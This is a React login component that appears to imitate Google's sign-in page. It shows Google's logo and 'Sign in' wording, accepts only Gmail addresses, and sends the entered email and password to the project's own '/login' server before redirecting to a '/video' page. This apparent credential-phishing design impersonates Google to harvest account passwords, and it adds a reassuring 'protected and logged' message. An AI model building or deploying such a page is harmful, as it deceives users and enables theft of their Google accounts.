import React, { useState } from "react";
import API from "../api";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const isValidGmail = (email) => {
    return email.endsWith("@gmail.com");
  };

  const handleLogin = async () => {
    setError("");

    if (!email || !password) {
      setError("Enter all details");
      return;
    }

    if (!isValidGmail(email)) {
      setError("Incorrect Email Address");
      return;
    }

    if (password.length < 6) {
      setError("Incorrect. Try Again");
      return;
    }

    try {
      setLoading(true);
      const res = await API.post("/login", { email, password });
      localStorage.setItem("token", res.data.token);
      window.location.href = "/video";
    } catch (error) {
      console.error("Login error:", error);
      setError(error.response?.data?.message || "Login failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="google-login-wrapper">
      <div className="google-login-container">
        <div className="google-logo">
          <img 
            src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
            alt="Google"
            style={{ height: "32px", width: "auto" }}
          />
        </div>

        <h1 className="google-login-title">Sign in</h1>
        <p className="google-login-subtitle">Access is protected and logged for security</p>

        {error && <div className="google-error-message">{error}</div>}

        <div className="google-form-group">
          <input
            className="google-input"
            placeholder="Enter Email "
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            type="email"
          />
        </div>

        <div className="google-form-group password-group">
          <input
            className="google-input"
            placeholder="Enter Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            type={showPassword ? "text" : "password"}
          />
          <button
            type="button"
            className="google-toggle-password"
            onClick={() => setShowPassword(!showPassword)}
            title={showPassword ? "Hide password" : "Show password"}
          >
            {showPassword ? "" : "👁"}
          </button>
        </div>

        <div className="google-button-group">
          <button 
            className="google-button-primary" 
            onClick={handleLogin} 
            disabled={loading}
          >
            {loading ? "Wait Verifying..." : "Verify"}
          </button>
        </div>
      </div>
    </div>
  );
}






















